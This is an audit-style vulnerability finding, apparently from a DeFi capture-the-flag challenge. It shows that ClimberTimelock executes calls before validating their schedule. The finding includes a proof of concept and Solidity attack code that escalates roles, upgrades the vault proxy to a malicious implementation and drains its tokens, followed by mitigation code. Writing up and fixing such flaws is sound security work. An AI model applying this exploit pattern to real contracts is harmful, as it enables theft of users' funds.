### [H-1] ClimberTimelock executes operations before validating they were scheduled, enabling unauthorized arbitrary execution

**Description:** `ClimberTimelock.execute()` iterates through all target calls 
and executes them before checking `getOperationState(id) == ReadyForExecution`. 
This reversed order allows anyone to execute arbitrary calls through the timelock 
without prior scheduling — as long as one of those calls schedules the exact same 
operation during execution, satisfying the post-execution state check retroactively.

Combined with the timelock holding `ADMIN_ROLE` over itself, an attacker can:
1. Set `delay = 0` via `updateDelay()` — making any scheduled operation immediately ready
2. Grant themselves `PROPOSER_ROLE` — allowing them to call `schedule()`
3. Transfer vault ownership to themselves — enabling a UUPS implementation upgrade
4. Retroactively schedule the operation from within execution — satisfying the state check

**Impact:** An attacker can fully drain a vault protected by the timelock in a 
single transaction — bypassing all time delays, role restrictions, and withdrawal 
limits — by upgrading the vault's implementation to a malicious contract.

**Proof of Concept:**
1. Call `timelock.execute()` with 4 targets:
   - `timelock.updateDelay(0)` — remove the time delay
   - `timelock.grantRole(PROPOSER_ROLE, attacker)` — gain scheduling rights
   - `vault.transferOwnership(attacker)` — gain upgrade rights over the proxy
   - `attacker.scheduleOperation()` — retroactively schedule this exact operation
2. After `execute()` completes, deploy a malicious `ClimberVault` implementation 
   with an unrestricted `drain()` function.
3. Call `vault.upgradeToAndCall(maliciousImpl, "")` — attacker now owns the vault.
4. Call `drain(token, recovery)` — transfers all tokens out of the vault.

The circular dependency (dataElements encoding itself) is resolved by storing 
the operation arrays in contract storage and having `scheduleOperation()` read 
from state directly with no parameters.

<details>
<summary>Example Code Snippet</summary>

```solidity
contract MaliciousVault is ClimberVault {
    function drain(address token, address recovery) external {
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }
}

// Storage arrays break the circular dependency
address[] private _targets;
uint256[] private _values;
bytes[] private _dataElements;
bytes32 private _salt;

function attack(address recovery) external {
    // build operation arrays in storage
    _targets[3] = address(this);
    _dataElements[3] = abi.encodeWithSelector(this.scheduleOperation.selector);

    timelock.execute(_targets, _values, _dataElements, _salt);

    // after execute() — attacker owns the vault
    MaliciousVault newImpl = new MaliciousVault();
    vault.upgradeToAndCall(address(newImpl), "");
    MaliciousVault(address(vault)).drain(address(token), recovery);
}

function scheduleOperation() external {
    // reads from storage — no circular dependency
    timelock.schedule(_targets, _values, _dataElements, _salt);
}
```
</details>

**Recommended Mitigation:**
1. Check operation state BEFORE executing — move the `getOperationState()` 
   check to the top of `execute()`, before the target loop, not after.
2. Never allow the timelock to hold admin roles over itself — self-administration 
   enables privilege escalation from within an execution context.
3. Restrict `updateDelay()` to require a properly scheduled and delayed operation 
   itself — delay changes should not be instantly executable.

<details>
<summary>Mitigation Code</summary>

```solidity
// check state BEFORE execution, not after
function execute(...) external payable {
    bytes32 id = getOperationId(targets, values, dataElements, salt);

    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }
}

// remove self-administration — timelock should not hold ADMIN_ROLE
constructor(address admin, address proposer) {
    _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
    _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
    _grantRole(ADMIN_ROLE, admin);
    // removed: _grantRole(ADMIN_ROLE, address(this))
    _grantRole(PROPOSER_ROLE, proposer);
    delay = 1 hours;
}

// updateDelay must go through the scheduling process itself
// Remove the direct self-call pattern and require it to be
// scheduled as a normal operation with the full time delay.
// It should NOT be callable via msg.sender == address(this) directly
function updateDelay(uint64 newDelay) external onlyRole(ADMIN_ROLE) {
    if (newDelay > MAX_DELAY) revert NewDelayAboveMax();
    delay = newDelay;
}
```
</details>